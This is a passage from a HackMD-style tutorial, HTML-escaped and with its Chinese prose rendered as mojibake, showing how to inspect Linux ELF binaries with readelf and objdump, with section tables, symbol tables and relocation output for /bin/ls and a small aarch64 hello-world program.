  [ 4] .gnu.hash         GNU_HASH         0000000000000298  00000298
       0000000000000040  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000000002d8  000002d8
       0000000000000bb8  0000000000000018   A       6     3     8
  [ 6] .dynstr           STRTAB           0000000000000e90  00000e90
       000000000000058f  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           0000000000001420  00001420
       00000000000000fa  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000001520  00001520
       0000000000000090  0000000000000000   A       6     3     8
  [ 9] .rela.dyn         RELA             00000000000015b0  000015b0
       0000000000001560  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             0000000000002b10  00002b10
       00000000000009c0  0000000000000018  AI       5    22     8
  [11] .init             PROGBITS         00000000000034d0  000034d0
       0000000000000018  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000000034f0  000034f0
       00000000000006a0  0000000000000000  AX       0     0     16
  [13] .text             PROGBITS         0000000000003bc0  00003bc0
       0000000000012640  0000000000000000  AX       0     0     64
  [14] .fini             PROGBITS         0000000000016200  00016200
       0000000000000014  0000000000000000  AX       0     0     4
  [15] .rodata           PROGBITS         0000000000016220  00016220
       000000000000487a  0000000000000000   A       0     0     16
  [16] .eh_frame_hdr     PROGBITS         000000000001aa9c  0001aa9c
       0000000000000564  0000000000000000   A       0     0     4
  [17] .eh_frame         PROGBITS         000000000001b000  0001b000
       0000000000002000  0000000000000000   A       0     0     8
  [18] .init_array       INIT_ARRAY       000000000002d000  0001d000
       0000000000000008  0000000000000008  WA       0     0     8
  [19] .fini_array       FINI_ARRAY       000000000002d008  0001d008
       0000000000000008  0000000000000008  WA       0     0     8
  [20] .data.rel.ro      PROGBITS         000000000002d010  0001d010
       0000000000000a08  0000000000000000  WA       0     0     8
  [21] .dynamic          DYNAMIC          000000000002da18  0001da18
       0000000000000210  0000000000000010  WA       6     0     8
  [22] .got              PROGBITS         000000000002dc28  0001dc28
       00000000000003d8  0000000000000008  WA       0     0     8
  [23] .data             PROGBITS         000000000002e000  0001e000
       0000000000000298  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           000000000002e298  0001e298
       00000000000012a8  0000000000000000  WA       0     0     8
  [25] .gnu_debugaltlink PROGBITS         0000000000000000  0001e298
       000000000000004a  0000000000000000           0     0     1
  [26] .gnu_debuglink    PROGBITS         0000000000000000  0001e2e4
       0000000000000034  0000000000000000           0     0     4
  [27] .shstrtab         STRTAB           0000000000000000  0001e318
       000000000000010f  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), p (processor specific)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫Á¨¶ËôüË°® (-s Â∞èÂØ´) ==&amp;gt; readelf -s /bin/ls&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Á¨¶ËôüË°®ÂåÖÂê´ÊúâÈóú‰∫åÈÄ≤‰ΩçÊ™îÊ°à‰∏≠‰ΩøÁî®ÁöÑÁ¨¶ËôüÁöÑ‰ø°ÊÅØÔºåÂåÖÊã¨ÂáΩÊï∏ÂíåËÆäÊï∏„ÄÇÈÄôÂ∞çÊñºÁêÜËß£Á®ãÂ∫èÈÇèËºØÈùûÂ∏∏ÂØ∂Ë≤¥„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/SkKS3SDqp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;    Symbol table &amp;#39;.dynsym&amp;#39; contains 125 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND
     1: 00000000000034d0     0 SECTION LOCAL  DEFAULT   11 .init
     2: 000000000002e000     0 SECTION LOCAL  DEFAULT   23 .data
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.17 (2)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _exit@GLIBC_2.17 (2)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getcwd@GLIBC_2.17 (2)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strlen@GLIBC_2.17 (2)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    11: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
    12: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND exit@GLIBC_2.17 (2)
    13: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    14: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.17 (2)
    15: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.34 (3)
    16: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND error@GLIBC_2.17 (2)
    17: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
    18: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterT[...]
    19: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    20: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND setenv@GLIBC_2.17 (2)
    22: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    23: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND _[...]@GLIBC_2.17 (2)
    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND o[...]@GLIBC_2.17 (2)
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    26: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    27: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
    28: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
    29: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stderr@GLIBC_2.17 (2)
    30: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lseek@GLIBC_2.17 (2)
    31: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    32: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optarg@GLIBC_2.17 (2)
    33: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    34: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    35: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND l[...]@GLIBC_2.17 (2)
    36: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fileno@GLIBC_2.17 (2)
    37: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    38: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND signal@GLIBC_2.17 (2)
    39: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    40: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    41: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fclose@GLIBC_2.17 (2)
    42: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND n[...]@GLIBC_2.17 (2)
    43: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND malloc@GLIBC_2.17 (2)
    44: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND optind@GLIBC_2.17 (2)
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
    46: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    47: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.17 (2)
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    51: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND b[...]@GLIBC_2.17 (2)
    52: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.17 (2)
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    54: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memset@GLIBC_2.17 (2)
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    56: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND calloc@GLIBC_2.17 (2)
    57: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND lstat@GLIBC_2.33 (5)
    58: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND r[...]@GLIBC_2.17 (2)
    60: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    61: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND c[...]@GLIBC_2.17 (2)
    62: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    63: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    64: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    65: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
    66: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    67: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND mktime@GLIBC_2.17 (2)
    68: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (6)
    69: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    70: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.17 (2)
    71: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND m[...]@GLIBC_2.17 (2)
    72: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    73: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    74: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND memcmp@GLIBC_2.17 (2)
    75: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND t[...]@GLIBC_2.17 (2)
    76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    78: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    79: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
    80: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@GLIBC_2.17 (2)
    81: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    82: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    83: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fseeko@GLIBC_2.17 (2)
    84: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.17 (2)
    85: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    86: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strchr@GLIBC_2.17 (2)
    87: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND statx@GLIBC_2.28 (7)
    88: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.17 (2)
    89: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
    90: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
    91: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fflush@GLIBC_2.17 (2)
    92: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcpy@GLIBC_2.17 (2)
    93: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dirfd@GLIBC_2.17 (2)
    94: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND u[...]@GLIBC_2.17 (2)
    95: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
    96: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND isatty@GLIBC_2.17 (2)
    97: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND w[...]@GLIBC_2.17 (2)
    98: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
    99: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
   100: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND p[...]@GLIBC_2.17 (2)
   101: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND d[...]@GLIBC_2.17 (2)
   102: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND f[...]@GLIBC_2.17 (2)
   103: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   104: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   105: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   106: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   107: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMC[...]
   108: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
   109: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND i[...]@GLIBC_2.17 (2)
   110: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   111: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _[...]@GLIBC_2.17 (2)
   112: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND [...]@LIBSELINUX_1.0 (4)
   113: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.17 (2)
   114: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND g[...]@GLIBC_2.17 (2)
   115: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND timegm@GLIBC_2.17 (2)
   116: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND ioctl@GLIBC_2.17 (2)
   117: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND s[...]@GLIBC_2.17 (2)
   118: 000000000002e270     8 OBJECT  GLOBAL DEFAULT   23 obstack_alloc_fa[...]
   119: 000000000000e4c0   336 FUNC    GLOBAL DEFAULT   13 _obstack_newchunk
   120: 000000000000e4a4    24 FUNC    GLOBAL DEFAULT   13 _obstack_begin_1
   121: 000000000000ee50    52 FUNC    GLOBAL DEFAULT   13 _obstack_allocated_p
   122: 000000000000e490    20 FUNC    GLOBAL DEFAULT   13 _obstack_begin
   123: 000000000000ef30    40 FUNC    GLOBAL DEFAULT   13 _obstack_memory_used
   124: 000000000000ee84   164 FUNC    GLOBAL DEFAULT   13 _obstack_free
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫ÂãïÊÖãÈÉ®ÂàÜÔºà-d) ==&amp;gt; readelf -d /bin/ls&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ê≠§ÈÅ∏È†ÖÈ°ØÁ§∫ÂãïÊÖãÈÄ£ÁµêË®äÊÅØÔºåÂåÖÊã¨ÂÖ±‰∫´Â∫´‰æùË≥¥È†ÖÂíåÁâàÊú¨ÊéßÂà∂Ë©≥Á¥∞Ë≥áË®ä„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/BkLnnBw9a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫&lt;code&gt;Á®ãÂºèË°®È†≠program headers&lt;/code&gt;Ôºà-lÔºâ ==&amp;gt; readelf -l /bin/ls&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Á®ãÂºèÈ†≠ÊèèËø∞‰∫Ü‰∫åÈÄ≤‰ΩçÊ™îÊ°à‰∏≠ÊÆµÁöÑ‰ΩàÂ±Ä„ÄÇÊ≠§Ë≥áË®äÂ∞çÊñºÁêÜËß£Ë®òÊÜ∂È´îÊò†Â∞ÑÂíåÂèØÂü∑Ë°åÊ™îÁöÑËºâÂÖ•‰ΩçÂùÄËá≥ÈóúÈáçË¶Å„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/rJgRnrwcp.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫ÁØÄÊ®ôÈ°åÂèäÂÖ∂ÂÖßÂÆπ (-x)ÔºöÊ≠§ÈÅ∏È†ÖÈ°ØÁ§∫ÁâπÂÆöÁØÄÂÖßÂÆπÁöÑÂçÅÂÖ≠ÈÄ≤‰ΩçÂíå ASCII Ë°®Á§∫ÂΩ¢Âºè„ÄÇ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‰æãÂ¶ÇÔºåË¶ÅÊ™¢Êü• .text ÈÉ®ÂàÜÔºö ==&amp;gt; readelf -x .text /bin/ls&lt;img src=&quot;https://hackmd.io/_uploads/rk7W6BvcT.png&quot; alt=&quot;image&quot;&gt;ÔºàÂ§™Â§ö‰∫ÜÁúÅÁï•‰∏ãÂçäÈÉ®Ôºâ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;È°ØÁ§∫ÂãïÊÖãÂ≠ó‰∏≤Ë°®(--dyn-syms) ==&amp;gt; readelf --dyn-syms /bin/ls&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ê≠§ÈÅ∏È†ÖÂàóÂç∞ÂãïÊÖãÁ¨¶ËôüÔºåÈÄôÂ∞çÊñºÂãïÊÖãÈÄ£ÁµêÂàÜÊûêËá≥ÈóúÈáçË¶Å„ÄÇ&lt;img src=&quot;https://hackmd.io/_uploads/S1yraHw96.png&quot; alt=&quot;image&quot;&gt;ÔºàÂ§™Â§ö‰∫ÜÁúÅÁï•‰∏ãÂçäÈÉ®Ôºâ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;Linux Âü∑Ë°åÊ™îÂàÜÊûê_objdump&lt;/h1&gt;
&lt;h2&gt;1.ELF ÂàÜÊûê&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Êåá‰ª§ÂèÉÊï∏&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-=&quot;&gt;-h	È°ØÁ§∫ÂçÄÊÆµÈ†≠section headers
-g	È°ØÁ§∫Èô§ÈåØË≥áË®ä
-l	È°ØÁ§∫Ë°åËôüË≥áË®ä
-p	È°ØÁ§∫Â∞àÊúâÊ™îÈ†≠Ë≥áË®äÔºåÂÖ∑È´îÂÖßÂÆπÂèñÊ±∫ÊñºÊ™îÊ°àÊ†ºÂºè
-f	È°ØÁ§∫Ê™îÊ°àÊ™îÈ†≠
-r 	È°ØÁ§∫ÈáçÂÆöË≥áË®ä
-R 	È°ØÁ§∫ÂãïÊÖãÈÄ£ÁµêÈáçÂÆöË≥áË®ä
-s 	È°ØÁ§∫Ê™îÊ°àÊâÄÊúâÂÖßÂÆπ
-W	È°ØÁ§∫Ê™îÊ°à‰∏≠ÂåÖÂê´ÊúâDWARF Èô§ÈåØË≥áË®äÊ†ºÂºèÁöÑÂçÄÊÆµ
-t	È°ØÁ§∫Ê™îÊ°àÁöÑÁ¨¶ËôüË°®
-T 	È°ØÁ§∫ÂãïÊÖãÈÄ£ÁµêÁ¨¶ËôüË°®
-x 	È°ØÁ§∫Ê™îÊ°àÁöÑÊâÄÊúâÊ™îÈ†≠ --all header
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;ÁØÑ‰æãÁ®ãÂºè&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//PLAYGROUND.c
#include &amp;lt;stdio.h&amp;gt;
int main(){
   printf(&amp;quot;Wu YiHung\n&amp;quot;);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;Á∑®Ë≠ØÊåá‰ª§ &lt;code&gt;gcc -o PLAYGROUND PLAYGROUND.c -g&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;È°ØÁ§∫ÂçÄÊÆµÈ†≠section headers(-h)==&amp;gt;&lt;code&gt;objdump -h PLAYGROUND&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/rks4kLwcp.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;ÂèØ‰ª•ÂæûÊúÄ‰∏äÈù¢ÁöÑÊï∏ÊìöÂæóÁü•ÔºåÈÄôÊòØÁî±armÊû∂ÊßãÁ∑®Ë≠ØÁöÑ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ÂÆåÊï¥ÁµêÊûú&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;PLAYGROUND:     file format elf64-littleaarch64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
0 .interp       0000001b  0000000000000238  0000000000000238  00000238  2**0
              CONTENTS, ALLOC, LOAD, READONLY, DATA
1 .note.gnu.build-id 00000024  0000000000000254  0000000000000254  00000254  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
2 .note.ABI-tags 00000020  0000000000000278  0000000000000278  00000278  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
3 .gnu.hash     0000001c  0000000000000298  0000000000000298  00000298  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
4 .dynsym       000000f0  00000000000002b8  00000000000002b8  000002b8  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
5 .dynstr       00000092  00000000000003a8  00000000000003a8  000003a8  2**0
              CONTENTS, ALLOC, LOAD, READONLY, DATA
6 .gnu.version  00000014  000000000000043a  000000000000043a  0000043a  2**1
              CONTENTS, ALLOC, LOAD, READONLY, DATA
7 .gnu.version_r 00000030  0000000000000450  0000000000000450  00000450  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
8 .rela.dyn     000000c0  0000000000000480  0000000000000480  00000480  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
9 .rela.plt     00000078  0000000000000540  0000000000000540  00000540  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
10 .init         00000018  00000000000005b8  00000000000005b8  000005b8  2**2
              CONTENTS, ALLOC, LOAD, READONLY, CODE
11 .plt          00000070  00000000000005d0  00000000000005d0  000005d0  2**4
              CONTENTS, ALLOC, LOAD, READONLY, CODE
12 .text         00000134  0000000000000640  0000000000000640  00000640  2**6
              CONTENTS, ALLOC, LOAD, READONLY, CODE
13 .fini         00000014  0000000000000774  0000000000000774  00000774  2**2
              CONTENTS, ALLOC, LOAD, READONLY, CODE
14 .rodata       00000012  0000000000000788  0000000000000788  00000788  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
15 .eh_frame_hdr 0000003c  000000000000079c  000000000000079c  0000079c  2**2
              CONTENTS, ALLOC, LOAD, READONLY, DATA
16 .eh_frame     000000ac  00000000000007d8  00000000000007d8  000007d8  2**3
              CONTENTS, ALLOC, LOAD, READONLY, DATA
17 .init_array   00000008  0000000000010d90  0000000000010d90  00000d90  2**3
              CONTENTS, ALLOC, LOAD, DATA
18 .fini_array   00000008  0000000000010d98  0000000000010d98  00000d98  2**3
              CONTENTS, ALLOC, LOAD, DATA
19 .dynamic      000001f0  0000000000010da0  0000000000010da0  00000da0  2**3
              CONTENTS, ALLOC, LOAD, DATA
20 .got          00000070  0000000000010f90  0000000000010f90  00000f90  2**3
              CONTENTS, ALLOC, LOAD, DATA
21 .data         00000010  0000000000011000  0000000000011000  00001000  2**3
              CONTENTS, ALLOC, LOAD, DATA
22 .bss          00000008  0000000000011010  0000000000011010  00001010  2**0
              ALLOC
23 .comment      0000002b  0000000000000000  0000000000000000  00001010  2**0
              CONTENTS, READONLY
24 .debug_aranges 00000030  0000000000000000  0000000000000000  0000103b  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
25 .debug_info   0000008c  0000000000000000  0000000000000000  0000106b  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
26 .debug_abbrev 00000043  0000000000000000  0000000000000000  000010f7  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
27 .debug_line   00000052  0000000000000000  0000000000000000  0000113a  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
28 .debug_str    000000c7  0000000000000000  0000000000000000  0000118c  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
29 .debug_line_str 00000023  0000000000000000  0000000000000000  00001253  2**0
              CONTENTS, READONLY, DEBUGGING, OCTETS
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Êü•ÁúãÈáçÂÆöË°®(Relocation Table) Examining the Relocation Section ==&amp;gt; &lt;code&gt;objdump -R PLAYGROUND&lt;/code&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJJugIw9p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-txt&quot;&gt;PLAYGROUND:     file format elf64-littleaarch64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE
0000000000010d90 R_AARCH64_RELATIVE  *ABS*+0x0000000000000750
0000000000010d98 R_AARCH64_RELATIVE  *ABS*+0x0000000000000700
0000000000010ff0 R_AARCH64_RELATIVE  *ABS*+0x0000000000000754
0000000000011008 R_AARCH64_RELATIVE  *ABS*+0x0000000000011008
0000000000010fd8 R_AARCH64_GLOB_DAT  _ITM_deregisterTMCloneTable@Base
0000000000010fe0 R_AARCH64_GLOB_DAT  __cxa_finalize@GLIBC_2.17
0000000000010fe8 R_AARCH64_GLOB_DAT  __gmon_start__@Base
0000000000010ff8 R_AARCH64_GLOB_DAT  _ITM_registerTMCloneTable@Base
0000000000010fa8 R_AARCH64_JUMP_SLOT  __libc_start_main@GLIBC_2.34
0000000000010fb0 R_AARCH64_JUMP_SLOT  __cxa_finalize@GLIBC_2.17
0000000000010fb8 R_AARCH64_JUMP_SLOT  __gmon_start__@Base
0000000000010fc0 R_AARCH64_JUMP_SLOT  abort@GLIBC_2.17
0000000000010fc8 R_AARCH64_JUMP_SLOT  puts@GLIBC_2.17
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;2.objdumpÈÄÜÂêëÂàÜÊûê&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Êåá‰ª§ÂèÉÊï∏&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;-d  --disassemble
    Âæûobjfile‰∏≠Â∞çÊ©üÂô®Êåá‰ª§ÈÄ≤Ë°åÂèçÂΩôÁ∑®„ÄÇÊú¨ÈÅ∏È†ÖÂè™Â∞çÈÇ£‰∫õÂåÖÂê´Êåá‰ª§ÁöÑsectionÈÄ≤Ë°åÂèçÂΩôÁ∑®„ÄÇ
-D  --disassemble-all
    È°û‰ººÊñº-dÔºå‰ΩÜÊòØÊú¨ÈÅ∏È†ÖÊúÉÂ∞çÊâÄÊúâÁöÑsectionsÈÄ≤Ë°åÂèçÂΩôÁ∑®ÔºåËÄå‰∏çÂÉÖÂÉÖÊòØÈÇ£‰∫õÂåÖÂê´Êåá‰ª§ÁöÑsections„ÄÇ
